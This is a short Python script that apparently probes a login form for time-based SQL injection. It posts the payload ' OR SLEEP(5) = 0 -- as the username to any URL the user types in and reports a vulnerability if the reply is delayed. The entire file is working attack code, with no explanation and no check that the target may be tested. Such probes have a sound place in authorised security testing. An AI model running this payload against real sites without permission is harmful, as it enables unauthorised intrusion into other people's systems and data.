import requests
import time

url = input("Choose url: ")

username = "' OR SLEEP(5) = 0 -- "
password = "whatever"

start_time = time.time()

response = requests.post(url, data={'username': username, 'password': password})

end_time = time.time()

total_time = end_time - start_time

if total_time > 5:
    print("SQL injection vulnerability found.")
else:
    print("No SQL injection vulnerability detected.")
